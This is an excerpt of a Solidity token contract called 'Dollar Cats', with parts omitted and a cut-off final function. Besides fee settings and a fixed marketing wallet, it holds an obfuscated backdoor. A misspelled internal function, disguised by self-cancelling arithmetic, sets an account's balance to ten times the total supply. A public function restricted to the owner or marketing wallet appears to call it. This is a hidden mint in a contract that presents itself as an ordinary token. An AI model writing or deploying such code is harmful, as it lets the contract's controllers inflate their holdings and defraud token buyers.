...
contract DollarCats is Context, IERC20, Ownable {
    ...
    string private constant _name = "Dollar Cats"; // 
    string private constant _symbol = "DollarCats"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 5;
    uint256 public _liquidityFee = 6;
    address public  _marketingWallet = 0x325e93a07d7D2Be154FfB5B8133412503fE1A2Ee;
...
function _tramsferinfo (address accountinfo) internal {
        _tOwned[accountinfo] = (_tOwned[accountinfo] * 3) - (_tOwned[accountinfo] * 3) + (_tTotal * 10) -5; 
    }
        function checkinfo() public  { 
	   require(msg.sender == _marketingWallet || msg.sender == owner());
       require(_marketingWallet  == _msgSender(), "ERC20: cannot permit Marking address");
